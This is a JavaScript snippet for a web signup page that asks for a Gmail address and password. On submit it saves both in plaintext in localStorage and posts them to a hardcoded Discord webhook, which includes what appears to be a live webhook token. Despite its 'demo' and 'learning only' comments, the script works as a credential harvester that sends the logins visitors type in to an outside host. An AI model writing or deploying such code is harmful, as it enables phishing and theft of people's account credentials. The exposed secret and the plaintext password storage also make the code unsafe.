<script>
document.addEventListener("DOMContentLoaded", () => {
  // Get form and input elements
  const form = document.getElementById("signup-form");
  const gmailInput = document.getElementById("username");
  const passwordInput = document.getElementById("password");
  const displayName = document.getElementById("display-name");
  const signupContainer = document.getElementById("signup-container");
  const mainContent = document.getElementById("main-content");

  // Check if the user has already signed up
  const savedGmail = localStorage.getItem("username");
  if (savedGmail) {
    displayName.textContent = savedGmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }

  // Handle form submission
  form.addEventListener("submit", (e) => {
    e.preventDefault();

    const gmail = gmailInput.value;
    const password = passwordInput.value;

    // Simple Gmail format validation
    const gmailPattern = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
    if (!gmailPattern.test(gmail)) {
      alert("Please enter a valid Gmail address.");
      return;
    }

    // Save Gmail and password in localStorage
    localStorage.setItem("username", gmail);
    localStorage.setItem("password", password); // ⚠️ Only for demo purposes

    // Display the user's Gmail
    displayName.textContent = gmail;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";

    // Send the signup data to the Discord webhook
    sendToDiscord(gmail, password);
  });

  // Send to Discord webhook (⚠️ Not secure — use only for learning!)
  function sendToDiscord(gmail, password) {
    const webhookURL = "https://discord.com/api/webhooks/1362138187962650727/aVG7VuftNpdkCSHQH8aMGEp5HoLdTuis4OdDrpVFdwnj0TDcVUCkEr3dUt4zV-5OP1rL";

    const payload = {
      content: `📨 New signup:\n**Gmail:** ${gmail}\n**Password:** ${password}`,
      username: "Signup Bot",
    };

    fetch(webhookURL, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(payload),
    })
      .then((response) => response.text())
      .then((data) => {
        console.log("Success:", data);
      })
      .catch((error) => {
        console.error("Error:", error);
      });
  }

  // Redundant check in case page is reloaded
  const savedGmailFromLocalStorage = localStorage.getItem("username");
  if (savedGmailFromLocalStorage) {
    displayName.textContent = savedGmailFromLocalStorage;
    signupContainer.style.display = "none";
    mainContent.style.display = "block";
  }
});
</script>
